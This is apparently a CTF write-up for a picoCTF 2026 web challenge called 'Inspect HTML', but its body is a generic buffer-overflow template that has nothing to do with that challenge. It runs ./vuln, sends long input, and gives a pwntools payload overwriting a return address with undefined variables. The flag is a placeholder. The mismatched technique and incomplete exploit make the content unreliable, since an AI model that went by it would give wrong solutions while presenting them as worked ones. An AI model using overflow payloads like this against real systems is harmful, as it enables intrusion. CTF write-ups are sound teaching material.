# Inspect HTML

**CTF:** picoCTF 2026
**Category:** Web Exploitation
**Difficulty:** Easy

---

## 🧠 Approach

The program takes input but does not check length.

This suggests a **buffer overflow vulnerability**.

---

## 🔍 Solution

1. Run the binary:

   ```bash
   ./vuln
   ```

2. Send long input:

   ```bash
   python3 -c "print('A'*100)"
   ```

3. Program crashes → confirms overflow

4. Use offset to control return address

---

## 💻 Exploit

```python
from pwn import *

payload = b"A"*offset + p64(win_function)
p.sendline(payload)
```

---

## 🏁 Flag

```text
flag{example}
```

---

## 📌 Key Takeaways

* Always check input size
* Buffer overflows overwrite return addresses
* Use tools like GDB to find offsets

